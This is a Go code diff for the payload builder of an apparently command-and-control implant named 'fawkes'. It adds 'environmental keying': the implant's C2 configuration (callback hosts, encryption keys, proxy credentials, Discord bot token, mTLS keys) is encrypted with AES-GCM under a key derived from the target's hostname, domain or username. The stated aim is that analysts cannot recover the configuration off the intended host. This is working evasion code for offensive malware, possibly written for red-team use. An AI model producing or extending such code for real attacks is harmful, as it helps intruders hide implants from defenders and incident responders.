@@ -1,7 +1,10 @@
 package agentfunctions
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	cryptorand "crypto/rand"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -318,6 +321,15 @@ func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkes
 		}
 	}
 
+	// Environmental keying: AES-GCM encrypt sensitive config with host-derived key
+	if ekDerive, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_derive"); err == nil && ekDerive != "" {
+		var deriveErr error
+		ldflags, deriveErr = applyEnvKeyDerive(payloadBuildMsg, fawkesMainPackage, ldflags, ekDerive)
+		if deriveErr != nil {
+			return "", deriveErr
+		}
+	}
+
 	return ldflags, nil
 }
 
@@ -472,4 +484,134 @@ func xorEncodeString(plaintext string, key []byte) string {
 		result[i] = b ^ key[i%len(key)]
 	}
 	return base64.StdEncoding.EncodeToString(result)
+}
+
+// sensitiveConfigVars lists the config variable names that contain C2-critical
+// data. When env_key_derive is active, these are extracted from ldflags and
+// bundled into the encrypted blob.
+var sensitiveConfigVars = []string{
+	"payloadUUID", "callbackHost", "callbackPort", "userAgent", "userAgentPool",
+	"encryptionKey", "getURI", "postURI", "hostHeader",
+	"proxyURL", "proxyUser", "proxyPass", "proxyDomain",
+	"customHeaders", "fallbackHosts", "contentTypes", "trafficProfile",
+	"discordBotToken", "discordChannelID", "httpxConfig", "httpxDomains",
+	"mtlsCertPEM", "mtlsKeyPEM", "xorKey",
+}
+
+// applyEnvKeyDerive encrypts sensitive config values with a key derived from
+// the target host's environment. The encrypted blob replaces the individual
+// ldflags for those values, so the binary contains no recoverable C2 config
+// unless it runs on the correct host.
+func applyEnvKeyDerive(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkesMainPackage, ldflags, method string) (string, error) {
+	var components []string
+
+	if strings.Contains(method, "hostname") {
+		ek, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_hostname")
+		if err != nil || ek == "" {
+			return "", fmt.Errorf("env_key_derive=%q requires env_key_hostname to be set with the exact target hostname", method)
+		}
+		components = append(components, strings.ToLower(strings.TrimSpace(ek)))
+	}
+	if strings.Contains(method, "domain") {
+		ek, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_domain")
+		if err != nil || ek == "" {
+			return "", fmt.Errorf("env_key_derive=%q requires env_key_domain to be set with the exact target domain", method)
+		}
+		components = append(components, strings.ToLower(strings.TrimSpace(ek)))
+	}
+	if strings.Contains(method, "username") {
+		ek, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_username")
+		if err != nil || ek == "" {
+			return "", fmt.Errorf("env_key_derive=%q requires env_key_username to be set with the exact target username", method)
+		}
+		components = append(components, strings.ToLower(strings.TrimSpace(ek)))
+	}
+
+	if len(components) == 0 {
+		return "", fmt.Errorf("env_key_derive=%q matched no components", method)
+	}
+
+	// Derive 32-byte AES key (must match agent-side deriveEnvironmentKey)
+	seed := "fawkes-env-derive:" + strings.Join(components, ":")
+	key := sha256.Sum256([]byte(seed))
+
+	// Extract current values from ldflags (may be XOR-encoded if obfuscate_strings is active)
+	configMap := make(map[string]string)
+	for _, varName := range sensitiveConfigVars {
+		val := extractLdflagValue(ldflags, fawkesMainPackage, varName)
+		if val != "" {
+			configMap[varName] = val
+		}
+	}
+
+	if len(configMap) == 0 {
+		return "", fmt.Errorf("env_key_derive: no sensitive config values found in ldflags")
+	}
+
+	jsonBytes, err := json.Marshal(configMap)
+	if err != nil {
+		return "", fmt.Errorf("env_key_derive: failed to marshal config: %w", err)
+	}
+
+	encrypted, err := envDeriveEncrypt(key[:], jsonBytes)
+	if err != nil {
+		return "", fmt.Errorf("env_key_derive: encryption failed: %w", err)
+	}
+	blob := base64.StdEncoding.EncodeToString(encrypted)
+
+	// Remove individual sensitive variable ldflags (they're now in the blob)
+	for _, varName := range sensitiveConfigVars {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, varName)
+	}
+
+	// Remove env_key_* ldflags for derived components (derive replaces match check)
+	if strings.Contains(method, "hostname") {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, "envKeyHostname")
+	}
+	if strings.Contains(method, "domain") {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, "envKeyDomain")
+	}
+	if strings.Contains(method, "username") {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, "envKeyUsername")
+	}
+
+	ldflags += fmt.Sprintf(" -X '%s.envKeyDerive=%s'", fawkesMainPackage, method)
+	ldflags += fmt.Sprintf(" -X '%s.envDerivedBlob=%s'", fawkesMainPackage, blob)
+
+	return ldflags, nil
+}
+
+// envDeriveEncrypt performs AES-256-GCM encryption with a random 12-byte nonce prepended.
+func envDeriveEncrypt(key, plaintext []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := cryptorand.Read(nonce); err != nil {
+		return nil, err
+	}
+	return gcm.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+// removeLdflag removes a -X 'pkg.varName=...' entry from the ldflags string.
+func removeLdflag(ldflags, pkg, varName string) string {
+	prefix := fmt.Sprintf("-X '%s.%s=", pkg, varName)
+	idx := strings.Index(ldflags, prefix)
+	if idx < 0 {
+		return ldflags
+	}
+	end := strings.Index(ldflags[idx+len(prefix):], "'")
+	if end < 0 {
+		return ldflags
+	}
+	flagEnd := idx + len(prefix) + end + 1
+	// Remove the flag and any leading/trailing space
+	result := ldflags[:idx] + ldflags[flagEnd:]
+	result = strings.ReplaceAll(result, "  ", " ")
+	return strings.TrimSpace(result)
 }
